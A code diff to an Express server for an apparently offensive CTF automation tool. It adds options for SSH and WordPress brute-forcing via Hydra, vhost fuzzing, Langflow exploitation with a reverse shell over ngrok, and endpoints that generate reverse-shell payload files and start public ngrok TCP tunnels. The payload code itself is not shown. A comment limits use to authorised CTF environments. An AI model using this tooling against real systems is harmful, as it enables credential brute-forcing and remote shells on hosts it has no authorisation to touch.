@@ -49,6 +49,8 @@ import { enumerateSubdomainsWithSubfinder, enumerateSubdomainsWithAmass } from '
 import { runGhostCtfPipeline } from './ghostctf/pipeline.js';
 import { getPlatform } from './ghostctf/platforms.js';
 import { attachShellWebSocket } from './ghostctf/shell-ws.js';
+import { makeGhostctfPayload, saveGhostctfPayloadToProject } from './ghostctf/payload-kit.js';
+import { resolveNgrokTcpForLocalPort, startNgrokTcpAndResolve } from './ghostctf/ngrok-local.js';
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
@@ -975,6 +977,45 @@ app.post('/api/ghostctf/stream', async (req, res) => {
   const tcpAllPorts = Boolean(req.body?.tcpAllPorts);
   const hostsOnlyWeb = Boolean(req.body?.hostsOnlyWeb);
 
+  const smRaw = req.body?.secondaryMysqlHosts;
+  const secondaryMysqlHosts = (
+    Array.isArray(smRaw)
+      ? smRaw.map((s) => normIp(s))
+      : typeof smRaw === 'string'
+        ? smRaw.split(/[\n,]+/).map((s) => normIp(s))
+        : []
+  )
+    .filter((h) => isValidIpv4(h))
+    .slice(0, 8);
+
+  const vhostBaseDomain = String(req.body?.vhostBaseDomain || '')
+    .trim()
+    .replace(/^https?:\/\//i, '')
+    .split('/')[0];
+  const vhostFuzzExtraPrefixes = String(req.body?.vhostFuzzExtraPrefixes || '').trim();
+
+  const sshBruteUsers = String(req.body?.sshBruteUsers || '').trim();
+  const sshBruteWordlistPath = String(req.body?.sshBruteWordlistPath || '').trim();
+  const sshBruteMaxPasswords = Math.min(500, Math.max(20, Number(req.body?.sshBruteMaxPasswords) || 150));
+  const sshBruteAutoHydra = Boolean(req.body?.sshBruteAutoHydra);
+  const sshBruteAutoTimeoutMs = Math.min(
+    7_200_000,
+    Math.max(300_000, Number(req.body?.sshBruteAutoTimeoutMs) || 1_800_000),
+  );
+  const sshBruteSolydWordlists = Boolean(req.body?.sshBruteSolydWordlists);
+
+  const hydraWpBruteUsers = String(req.body?.hydraWpBruteUsers || '').trim();
+  const hydraWpBruteWordlistPath = String(req.body?.hydraWpBruteWordlistPath || '').trim();
+  const hydraWpBruteMaxPasswords = Math.min(500, Math.max(20, Number(req.body?.hydraWpBruteMaxPasswords) || 150));
+
+  const langflowHostHeader = String(req.body?.langflowHostHeader || '').trim();
+  const langflowTryAllOrigins = Boolean(req.body?.langflowTryAllOrigins);
+  const langflowVerticesShell = Boolean(req.body?.langflowVerticesShell);
+  const langflowNgrokHost = String(req.body?.langflowNgrokHost || '').trim();
+  const langflowNgrokPort = Number(req.body?.langflowNgrokPort) || 0;
+  const langflowBuildFlowId = String(req.body?.langflowBuildFlowId || '').trim();
+  const langflowAlsoTryFlagPath = Boolean(req.body?.langflowAlsoTryFlagPath);
+
   if (!ipRaw || !isValidIpv4(normIp(ipRaw))) {
     send({ type: 'error', message: 'IP inválido (use IPv4)' });
     res.end();
@@ -992,6 +1033,25 @@ app.post('/api/ghostctf/stream', async (req, res) => {
       hostsOnlyWeb,
       udpScan,
       tcpAllPorts,
+      secondaryMysqlHosts,
+      vhostBaseDomain,
+      vhostFuzzExtraPrefixes,
+      sshBruteUsers,
+      sshBruteWordlistPath,
+      sshBruteMaxPasswords,
+      sshBruteAutoHydra,
+      sshBruteAutoTimeoutMs,
+      sshBruteSolydWordlists,
+      hydraWpBruteUsers,
+      hydraWpBruteWordlistPath,
+      hydraWpBruteMaxPasswords,
+      langflowHostHeader,
+      langflowTryAllOrigins,
+      langflowVerticesShell,
+      langflowNgrokHost,
+      langflowNgrokPort,
+      langflowBuildFlowId,
+      langflowAlsoTryFlagPath,
       emit: send,
       saveRun,
     });
@@ -1138,6 +1198,90 @@ app.post('/api/ghostctf/hash', async (req, res) => {
     inputLength: text.length,
     hashes: { md5, sha1, sha256 },
   });
+});
+
+/** Payloads mínimos para CTF (vários formatos) — upload manual no alvo; só em ambiente autorizado. */
+app.post('/api/ghostctf/payload-file', (req, res) => {
+  const kind = String(req.body?.kind || '').trim();
+  const lhostRaw = String(req.body?.lhost || '').trim();
+  const lportNum = Number(req.body?.lport);
+  const r = makeGhostctfPayload(kind, lhostRaw, lportNum);
+  if (!r.ok) {
+    res.status(r.status).json({ ok: false, error: r.error });
+    return;
+  }
+  res.setHeader('Content-Type', 'application/octet-stream');
+  res.setHeader('Content-Disposition', `attachment; filename="${r.filename}"`);
+  res.send(r.body);
+});
+
+/** Grava o mesmo payload em <raiz do projeto>/payloads/ (pasta criada automaticamente). */
+app.post('/api/ghostctf/payload-save', async (req, res) => {
+  try {
+    const kind = String(req.body?.kind || '').trim();
+    const lhostRaw = String(req.body?.lhost || '').trim();
+    const lportNum = Number(req.body?.lport);
+    const out = await saveGhostctfPayloadToProject(kind, lhostRaw, lportNum);
+    if (!out.ok) {
+      res.status(out.status).json({ ok: false, error: out.error });
+      return;
+    }
+    res.json({
+      ok: true,
+      relativePath: out.relativePath,
+      absolutePath: out.absolutePath,
+      filename: out.filename,
+      lport: out.lport,
+    });
+  } catch (e) {
+    res.status(500).json({ ok: false, error: e?.message || String(e) });
+  }
+});
+
+/**
+ * Ngrok: sempre HTTP 200 + JSON { ok, error? } para o browser não confundir com “rota em falta”.
+ * Lê http://127.0.0.1:4040/api/tunnels — preenche LHOST/LPORT do payload com o endpoint público TCP.
+ */
+app.post('/api/ghostctf/ngrok-resolve', async (req, res) => {
+  try {
+    const localPort = Number(req.body?.localPort);
+    const out = await resolveNgrokTcpForLocalPort(localPort);
+    if (!out.ok) {
+      res.json({ ok: false, error: out.error });
+      return;
+    }
+    res.json({
+      ok: true,
+      ngrokHost: out.ngrokHost,
+      ngrokPort: out.ngrokPort,
+      publicUrl: out.publicUrl,
+      localPort: out.localPort,
+    });
+  } catch (e) {
+    res.json({ ok: false, error: e?.message || String(e) });
+  }
+});
+
+/** Tenta `ngrok tcp <localPort>` em background e faz poll até o túnel aparecer na API local. */
+app.post('/api/ghostctf/ngrok-tcp-start', async (req, res) => {
+  try {
+    const localPort = Number(req.body?.localPort);
+    const out = await startNgrokTcpAndResolve(localPort);
+    if (!out.ok) {
+      res.json({ ok: false, error: out.error });
+      return;
+    }
+    res.json({
+      ok: true,
+      ngrokHost: out.ngrokHost,
+      ngrokPort: out.ngrokPort,
+      publicUrl: out.publicUrl,
+      localPort: out.localPort,
+      started: Boolean(out.started),
+    });
+  } catch (e) {
+    res.json({ ok: false, error: e?.message || String(e) });
+  }
 });
 
 async function crackMd5WithWordlist({ targetHash, wordlistPath, maxLines = 300000 }) {
